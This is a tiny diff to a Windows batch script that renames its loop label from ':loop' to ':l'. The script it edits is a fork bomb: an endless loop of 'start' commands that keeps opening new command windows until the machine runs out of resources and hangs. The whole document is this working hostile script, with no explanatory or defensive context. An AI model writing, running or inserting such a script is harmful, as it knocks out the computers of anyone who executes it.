@@ -1,7 +1,7 @@
 @echo off
-:loop
+:l
 start
 start 
 start 
 start
-goto:loop
+goto:l
